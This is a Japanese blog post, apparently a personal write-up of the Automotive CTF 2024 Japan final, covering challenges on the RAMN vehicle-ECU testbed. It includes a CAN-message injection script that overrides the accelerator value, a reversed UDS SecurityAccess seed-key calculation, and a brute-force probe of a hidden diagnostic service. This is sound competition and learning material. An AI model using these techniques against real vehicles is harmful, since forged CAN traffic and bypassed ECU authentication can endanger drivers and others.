@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Automotive CTF 2024 日本決勝 - 体験記 &amp; Writeup | 俺とお前とlaysakura</title>
+  
+  <link rel="canonical" href="https://laysakura.github.io/2024/09/14/automotive-ctf-2024-japan-final/"/>
+  <meta name="viewport" content="width=device-width">
+  <meta name="description" content="Automotive CTF Japanの日本決勝に “TeamOne” チームとして参加し、5チーム中2位で（ギリギリ）アメリカで開催される世界大会の出場権を手に入れました🎉（※所属とは無関係に個人活動として参加） チームのbeaさん、hamayanhamayanさん、kusano_kさん、tkitoさん、今回もありがとうございました！ CTF強者が集まるオンサイトのCTFということで、大">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Automotive CTF 2024 日本決勝 - 体験記 &amp; Writeup">
+<meta property="og:url" content="https://laysakura.github.io/2024/09/14/automotive-ctf-2024-japan-final/index.html">
+<meta property="og:site_name" content="俺とお前とlaysakura">
+<meta property="og:description" content="Automotive CTF Japanの日本決勝に “TeamOne” チームとして参加し、5チーム中2位で（ギリギリ）アメリカで開催される世界大会の出場権を手に入れました🎉（※所属とは無関係に個人活動として参加） チームのbeaさん、hamayanhamayanさん、kusano_kさん、tkitoさん、今回もありがとうございました！ CTF強者が集まるオンサイトのCTFということで、大">
+<meta property="og:locale" content="ja_JP">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/09-13/IMG_0551.jpg">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/09-13/PXL_20240912_233830976.jpg">
+<meta property="og:image" content="https://laysakura.github.io/img/2024/09-13/chal.png">
+<meta property="article:published_time" content="2024-09-13T19:30:24.000Z">
+<meta property="article:modified_time" content="2024-09-13T20:48:25.715Z">
+<meta property="article:author" content="Sho Nakatani a.k.a. laysakura">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://laysakura.github.io/img/2024/09-13/IMG_0551.jpg">
+
+  <!-- favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
+  <link rel="icon" href="/favicon/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-22289437-2']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+  <!-- MathJax -->
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div class="mobile-nav-panel">
+	<i class="icon-reorder icon-large"></i>
+</div>
+<header id="header">
+	<h1 class="blog-title">
+		<a href="/">俺とお前とlaysakura</a>
+	</h1>
+	<nav class="nav">
+		<ul>
+			<li><a href="/archives">過去の投稿</a></li>
+			<li><a id="nav-search-btn" class="nav-icon" title="Search"></a></li>
+			<li><a target="_blank" rel="noopener" href="http://cloud.feedly.com/#subscription%2Ffeed%2Fhttps%3A%2F%2Flaysakura.github.io%2Fatom.xml" id="nav-rss-link" class="nav-icon" title="RSS Feed"></a></li>
+		</ul>
+	</nav>
+	<div id="search-form-wrap">
+		<form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://laysakura.github.io"></form>
+	</div>
+</header>
+    <div id="main">
+      <article id="post-Automotive-CTF-2024-日本決勝-writeup" class="post">
+  <footer class="entry-meta-header">
+    <span class="meta-elements date">
+      <a href="/2024/09/14/automotive-ctf-2024-japan-final/" class="article-date">
+  <time datetime="2024-09-13T19:30:24.000Z" itemprop="datePublished">2024-09-14</time>
+</a>
+    </span>
+  </footer>
+  
+  <header class="entry-header">
+    
+  
+    <h1 class="article-title entry-title" itemprop="name">
+      Automotive CTF 2024 日本決勝 - 体験記 &amp; Writeup
+    </h1>
+  
+
+  </header>
+  <div class="entry-content">
+    
+    <img src="/img/2024/09-13/IMG_0551.jpg" alt="IMG_0551.jpg" width="auto" height="auto">
+
+<p><a target="_blank" rel="noopener" href="https://vicone.com/jp/automotive-ctf">Automotive CTF Japan</a>の日本決勝に “TeamOne” チームとして参加し、5チーム中2位で（ギリギリ）アメリカで開催される世界大会の出場権を手に入れました🎉<br>（※所属とは無関係に個人活動として参加）</p>
+<p>チームのbeaさん、hamayanhamayanさん、kusano_kさん、tkitoさん、今回もありがとうございました！</p>
+<p>CTF強者が集まるオンサイトのCTFということで、大変思い出に残ったので体験記を書きます。自分が解いたり関わったりした問題のWriteupも書きますが、実機がないと再現できない問題ばかりなので（出場した方以外は）「へぇー」くらいにお読みください。</p>
+<span id="more"></span>
+
+<h2><span id="目次">目次</span></h2><!-- toc -->
+
+<ul>
+<li><a href="#%E4%BD%93%E9%A8%93%E8%A8%98">体験記</a></li>
+<li><a href="#writeup">Writeup</a><ul>
+<li><a href="#ecu-a-slcan">[ECU A] slcan</a></li>
+<li><a href="#ecu-a-takeover">[ECU A] Takeover</a></li>
+<li><a href="#ecu-b-readdatabyidentifier">[ECU B] ReadDataByIdentifier</a></li>
+<li><a href="#ecu-a-override">[ECU A] Override</a></li>
+<li><a href="#ecu-b-securityaccess">[ECU B] SecurityAccess</a></li>
+<li><a href="#ecu-c-secret-code">[ECU C] Secret code</a></li>
+<li><a href="#ecu-b-ram-peak">[ECU B] RAM peak</a></li>
+<li><a href="#ecu-b-uds-backdoor">[ECU B] UDS Backdoor</a></li>
+<li><a href="#ecu-c-noiseless">[ECU C] Noiseless</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<h2><span id="体験記">体験記</span></h2><p>ベルサール六本木が会場。コンテストは9:30-16:00のそれなりの長丁場なので、補給が明暗を分けると思ってチーム全員分の甘味やおにぎりやサンドイッチを大量購入して現地インしました。現地にも大量に食物があったし弁当も出たのでめちゃくちゃ余りました💸</p>
+<p>開場時間に合わせて到着し、問題に関する情報がないかを探ります。事前告知の通り <a target="_blank" rel="noopener" href="https://ramn.readthedocs.io/en/latest/index.html">RAMN</a> というボードは用意がありました。これは予選以降ドキュメントやソースコードで徹底対策していたのでスルー。<br>それとは別に、スルーできないドライブシミュレーターがありました。</p>
+<img src="/img/2024/09-13/PXL_20240912_233830976.jpg" alt width="auto" height="auto">
+
+<p><a target="_blank" rel="noopener" href="https://carla.org/">CARLA</a> というシミュレーターに <a target="_blank" rel="noopener" href="https://www.chip1stop.com/sp/products/toyota-pasta">PASTA</a> というスーツケース型の自動車のコンピューターを模擬した機械が繋がっているものでした。PASTAは全然触ったことがないので、急ぎ刺さっていたBluetoothの解析・ドキュメント読み・ソースコード読みを進めました。UDSのサービスセットやCAN IDのリストを把握し、コンテスト開始前に圧倒的アドバンテージを得たと思ったのですが、開会式で「あそこのドライブシミュレーターは使いません」と司会が言って「使わんのかい！！」ってなりました。</p>
+<p>チーム全体での顔合わせは今日初めて（一部ハードウェア問題の対策とか別のCTFイベントでお会いしてたりはした）でしたが、DiscordやZoomでそれなりに綿密に戦略会議やら勉強会やらしてきたおかげで連携は問題ないどころか老舗チームにも負けてなかったのではと思います。</p>
+<p>コンテストが始まってチャレンジを開きます。</p>
+<img src="/img/2024/09-13/chal.png" alt width="600px" height="auto">
+
+<p>ほとんどがRAMNを使った問題。RAMN対策は分担として自分が一番できていたので、自分のPCに繋ぎます。<br>ログ解析が得意な人にcandumpを取って渡したり、revが得意な人がSecurity Accessのアルゴリズム解析をしてくれた後にChallenge-and-Responseを実施するオペレーターとなったりの下働きをしつつ、自身としてはUDS問題を中心にアプローチしていました。</p>
+<p>昼前後くらいにあと1問（RAM peak）を残して割と点差を付けた1位で「勝ったなガハハ！」と思っていましたが、その1問が最後まで解き切れず、見事全問解いたieraeに逆転負けを喫しました…<br>コンテスト後にieraeの人に解き方を聞いて、似たアプローチはしてたけど問題タイトルからのメタ読み（peak &#x3D; 頂点だから何かのメモリ領域の最大値付近の探索だな）をし過ぎていたことがわかりました。丁寧な全探索ができなかったのは猛省です。</p>
+<p>懇親会では主催のVicOneの方や後援の企業・団体の方とおしゃべりしたり、他のチームの人ともお話できました。CANというプロトコルをベースにしてIn-Carセキュリティを担保することの難しさやら、予選問題の論評を語り合って面白かったです。<br>ドライブシミュレーターを運転しているときにCANバスに介入されてハンドルを勝手に操作されたりギアをR（リバース）に入れられたりして、良きデモだなぁと思いました。</p>
+<p>会場もきれいで広く、司会はフリーアナウンサーの方が務めておられたりと、豪華な大会でした。重ね重ね、主催・後援の方々、スタッフの皆様、ありがとうございました！！！</p>
+<h2><span id="writeup">Writeup</span></h2><p>フラグとかはメモってないのでだいぶ雑writeupです。</p>
+<h3><span id="ecu-a-slcan">[ECU A] slcan</span></h3><blockquote>
+<p>ボードのslcanバージョン番号にフラグがあります。</p>
+</blockquote>
+<p>RAMNを繋いだUSBでシリアル通信を確立。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picocom --imap crcrlf --<span class="built_in">echo</span> /dev/ttyACM2 -b 500000</span><br></pre></td></tr></table></figure>
+
+<p>バージョン番号を出すための <code>V</code> コマンド入力でフラグが出た。</p>
+<h3><span id="ecu-a-takeover">[ECU A] Takeover</span></h3><blockquote>
+<p>各CANメッセージが、ブレーキ 0xF0x、アクセル 0xDDx、ステアリングホイール 0xF1x、エンジンキー 0x02、ライトスイッチ 0x01、サイドブレーキ 0x00の場合、画面の下部にフラグが表示されます。</p>
+<p>注意:</p>
+<p>末尾のxはCANメッセージの末尾4bitは無視することを意味します。<br>このチャレンジではCRCとカウンターは無視されます。<br>画面に表示されるフラグ内の空白は”_”に置き換えてください。</p>
+</blockquote>
+<p>どのCAN IDがRAMNのどの機構と対応しているのかを見出し、丁寧にRAMNをいじる問題。</p>
+<p>SavvyCANでCAN信号を表示するところまで自分がやって、あとは隣のチームメンバーが丁寧にいじっているのをニコニコして見てたらフラグが出てた。</p>
+<h3><span id="ecu-b-readdatabyidentifier">[ECU B] ReadDataByIdentifier</span></h3><blockquote>
+<p>ECUはData Identifierの1つにフラグを保持しています。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/CaringCaribou/caringcaribou">caringcaribou</a> による全探索で瞬殺。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caringcaribou uds dump_dids 0x7e1 0x7e9</span><br></pre></td></tr></table></figure>
+
+<p>フラグをASCIIエンコードしたhexが表示された。今回のRAMNファームではDIDはフラグの一種類だけだった。</p>
+<h3><span id="ecu-a-override">[ECU A] Override</span></h3><blockquote>
+<p>アクセルを0xFFF以上の有効なCANメッセージに強制できれば、画面の下部にフラグが表示されます。</p>
+<p>注意:</p>
+<p>正しいCRCタイプとエンディアンを特定する必要があります。<br>画面に表示されるフラグ内の空白は”_”に置き換えてください。</p>
+</blockquote>
+<p>「ボディECUのアクセルが出しているCANメッセージよりも速い周期で随意のアクセル開度のCANメッセージをプログラムで送れば良い」というアイディア出しと、プログラムを実行するのを担当した。<br>CANデータの解析やCRC特定やら含め、プログラムはチームメンバーが書いてくれた。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> can</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> can.Bus(interface=<span class="string">&quot;socketcan&quot;</span>, channel=<span class="string">&quot;can0&quot;</span>) <span class="keyword">as</span> bus:</span><br><span class="line">    accel = [<span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        accel[<span class="number">2</span>] = (i &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        accel[<span class="number">3</span>] = i &amp; <span class="number">0xFF</span></span><br><span class="line">        crc = binascii.crc32(<span class="built_in">bytes</span>(accel[<span class="number">0</span>:<span class="number">4</span>]))</span><br><span class="line">        accel[<span class="number">4</span>] = crc &amp; <span class="number">0xFF</span></span><br><span class="line">        accel[<span class="number">5</span>] = (crc &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        accel[<span class="number">6</span>] = (crc &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        accel[<span class="number">7</span>] = (crc &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line"></span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">        msg = can.Message(arbitration_id=<span class="number">0x010</span>, data=accel, is_extended_id=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            bus.send(msg)</span><br><span class="line">        <span class="keyword">except</span> can.CanError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Send message failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br></pre></td></tr></table></figure>
+
+<p>これ実行したらECUのディスプレイにフラグが表示された。</p>
+<h3><span id="ecu-b-securityaccess">[ECU B] SecurityAccess</span></h3><blockquote>
+<p>ECUはData Identifier 0xFFFFにフラグを保持しています。ただし、始めに認証が必要です。</p>
+</blockquote>
+<p>UDSのSecurity Accessの問題。添付に、Challenge-and-Responseのアルゴリズム周辺のアセンブリコード。</p>
+<p>Security Accessのプロトコルのレクチャーと、アルゴリズムにchallengeを入力して出力のresponseをECUに渡すオペレーターの役割をした。<br>アルゴリズムはチームメイトが解析してこんな感じ。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># `chall` がシード（チャレンジ）。キー（レスポンス）が出力される</span></span><br><span class="line">python3 -c <span class="string">&#x27;chall=0x528A2019 ; print(hex((chall*3+0x1220+20)&amp;0xffffffff^0xffff))&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>これでSecurity Accessが突破できた後、Read Data By Identifierサービスで <code>FFFF</code> のDIDを要求するとフラグゲット。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isotprecv -s 7e1 -d 7e9 can0</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;22 FF FF&quot;</span> | isotpsend -s 7e1 -d 7e9 can0</span><br></pre></td></tr></table></figure>
+
+<h3><span id="ecu-c-secret-code">[ECU C] Secret code</span></h3><blockquote>
+<p>ECU Cは秘密のCANメッセージを待っています。</p>
+<p>注意: エンディアンに注意してください。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">candump -a -t a can0  |<span class="built_in">tee</span> candump.log</span><br></pre></td></tr></table></figure>
+
+<p>でcandumpログを作ってチームメイトに渡しただけ。解き方もフラグも分かってない。</p>
+<h3><span id="ecu-b-ram-peak">[ECU B] RAM peak</span></h3><blockquote>
+<p>RAMにはReadMemoryByAddressサービスで読み取れるフラグがあります。フラグの長さは17文字です。</p>
+</blockquote>
+<p>これが最後まで解けなかった…</p>
+<p>解けたチームの人に聞くと、RAMNのECUのSoC、<a target="_blank" rel="noopener" href="https://www.st.com/resource/en/datasheet/stm32l552cc.pdf">STM32L552のデータシート</a>とかに書いてあるEmbedded SRAMの有効なアドレス範囲を1バイトずつずらして開始アドレスにし、長さは17文字にしてRead Memory By Addressを要求するとフラグが出るらしい。</p>
+<p>この全探索をサボって問題タイトル「peak」のメタ読みをして、違う開始アドレスばかり試していた。RAMNを自分のPCに繋いでいる身として、一番手を動かす機会があったはず。猛省猛省アンド猛省。</p>
+<h3><span id="ecu-b-uds-backdoor">[ECU B] UDS Backdoor</span></h3><blockquote>
+<p>隠されたUDSサービスがあります。これに対して有効なリクエストをフォーマットできますか？</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">% caringcaribou uds services 0x7e1 0x7e9</span><br><span class="line"></span><br><span class="line">-------------------</span><br><span class="line">CARING CARIBOU v0.7 - python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0]</span><br><span class="line">-------------------</span><br><span class="line"></span><br><span class="line">Loading module <span class="string">&#x27;uds&#x27;</span></span><br><span class="line"></span><br><span class="line">Probing service 0xff (255/255): found 7</span><br><span class="line">Done!</span><br><span class="line"></span><br><span class="line">Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL</span><br><span class="line">Supported service 0x11: ECU_RESET</span><br><span class="line">Supported service 0x22: READ_DATA_BY_IDENTIFIER</span><br><span class="line">Supported service 0x23: READ_MEMORY_BY_ADDRESS</span><br><span class="line">Supported service 0x27: SECURITY_ACCESS</span><br><span class="line">Supported service 0x3e: TESTER_PRESENT</span><br><span class="line">Supported service 0x55: Unknown service</span><br></pre></td></tr></table></figure>
+
+<p>ということで、0x55が「隠されたUDSサービス」っぽい。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% <span class="built_in">echo</span> <span class="string">&quot;55 00 00&quot;</span> | isotpsend -s 7e1 -d 7e9 can0</span><br></pre></td></tr></table></figure>
+
+<p>みたいにサービスのパラメーターのバイト数を確かめていくと、全3バイトのとき以外は <code>incorrectMessageLengthOrInvalidFormat</code> のエラー。3バイトっぽい。</p>
+<p>2バイト目のsub functionを全探索すると、 <code>1A</code> のときに限り <code>serviceNotSupportedInActiveSession</code> のエラー。</p>
+<p>3バイト目も全探索でフラグ。最後の全探索のコードだけ手元に残ってた。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> isotp</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> can_uds.comm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> can_uds.util <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_0x55_service</span>(<span class="params">sock: isotp.socket</span>):</span><br><span class="line">    <span class="comment"># 命令長が3バイトなのは分かっている</span></span><br><span class="line">    <span class="comment"># 2バイト目が 1A であることが分かっている。</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x00</span>, <span class="number">0xFF</span> + <span class="number">1</span>):</span><br><span class="line">        resp = send_recv(sock, <span class="built_in">bytes</span>([<span class="number">0x55</span>, <span class="number">0x1A</span>, i]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># resp が 7F 55 12 でなかったらprint</span></span><br><span class="line">        <span class="keyword">if</span> resp != <span class="built_in">bytes</span>([<span class="number">0x7F</span>, <span class="number">0x55</span>, <span class="number">0x12</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;3rd-byte: <span class="subst">&#123;i:02X&#125;</span>, resp: <span class="subst">&#123;resp.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;interface&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;CAN バスインターフェース名&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    source_id = <span class="number">0x7E1</span></span><br><span class="line">    dest_id = <span class="number">0x7E9</span></span><br><span class="line"></span><br><span class="line">    sock = create_socket(args.interface, source_id, dest_id)</span><br><span class="line">    solve_0x55_service(sock)</span><br></pre></td></tr></table></figure>
+
+<h3><span id="ecu-c-noiseless">[ECU C] Noiseless</span></h3><blockquote>
+<p>ブレーキのCANメッセージの最下位ビットはノイズではありません。</p>
+<p>注意: 1分間のCANメッセージログにフラグを取得するために必要なすべてが含まれています。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">candump -a -t a can0  |<span class="built_in">tee</span> candump-accel.log</span><br></pre></td></tr></table></figure>
+
+<p>しつつ、RAMNのブレーキを規則的に動かす役割だけした。あとはジェバンニが一晩でやってくれました。</p>
+
+    
+  </div>
+  <footer class="entry-footer">
+    <div class="entry-meta-footer">
+      <span class="category">
+        
+      </span>
+      <span class="tags">
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+      </span>
+    </div>
+  </footer>
+  
+  <footer class="author-info clearfix">
+    <img class="author-picture circle" src="https://www.gravatar.com/avatar/cb02a2b3f429b7c938d1fe2665e8e342">
+    <div class="author-content right">
+      <div class="author-caption">
+        <span class="label">author</span>
+        Sho Nakatani a.k.a. laysakura
+      </div>
+      <p class="author-description">
+        トヨタ自動車株式会社所属。プリンシパル・リサーチャーとして、セキュリティ・プライバシー・データ基盤に関する業務に従事。<br>
+        OSCP/BSCP/CISSP/情報処理安全確保支援士(合格) 等の資格保有。CTF出場やセキュリティ関連の講演活動も行っている。<br>
+        （<a target="_blank" rel="noopener" href="https://github.com/laysakura/resume-jp">詳細プロフィール</a>）
+      </p>
+      <ul class="author-social-buttons">
+        <li class="author-social-button"><a class="fa fa-lg fa-twitter-square" target="_blank" rel="noopener" href="https://twitter.com/laysakura"></a>
+        </li>
+        <li class="author-social-button"><a class="fa fa-lg fa-github-square" target="_blank" rel="noopener" href="https://github.com/laysakura"></a>
+        </li>
+      </ul>
+    </div>
+  </footer>
+  
+  
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2024/09/09/automotive-ctf-2024-qual/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">
+        
+          Automotive CTF Japan 2024 予選 - writeup
+        
+      </div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+<section id="comments">
+  <div id="disqus_thread">
+
+    <!-- comment service provided by disqus -->
+    <script>
+      /**
+       *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+       *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+       */
+      var disqus_config = function () {
+        this.page.url = https://laysakura.github.io/2024/09/14/automotive-ctf-2024-japan-final/;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = https://laysakura.github.io/2024/09/14/automotive-ctf-2024-japan-final/; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+      };
+      (function () {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+
+        s.src = '//laysakura.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      })();
+    </script>
+
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+        Disqus.</a></noscript>
+  </div>
+</section>
+
+
+    </div>
+    <div class="mb-search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:laysakura.github.io">
+  </form>
+</div>
+<footer id="footer">
+	<h1 class="footer-blog-title">
+		<a href="/">俺とお前とlaysakura</a>
+	</h1>
+	<span class="copyright">
+		&copy; 2024 Sho Nakatani a.k.a. laysakura<br>
+		Modify from <a href="https://sanographix.github.io/tumblr/apollo/" target="_blank">Apollo</a> theme, designed by <a href="https://www.sanographix.net/" target="_blank">SANOGRAPHIX.NET</a><br>
+		Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+	</span>
+</footer>
+
+    
+<script>
+  var disqus_shortname = 'laysakura';
+  
+  var disqus_url = 'https://laysakura.github.io/2024/09/14/automotive-ctf-2024-japan-final/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+
+  <!-- https://github.com/vfeskov/vanilla-back-to-top -->
+  <script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+  <script>addBackToTop({
+    diameter: 50,
+    backgroundColor: '#33a6b880',
+    textColor: '#fff'
+  })</script>
+
+</body>
+</html>
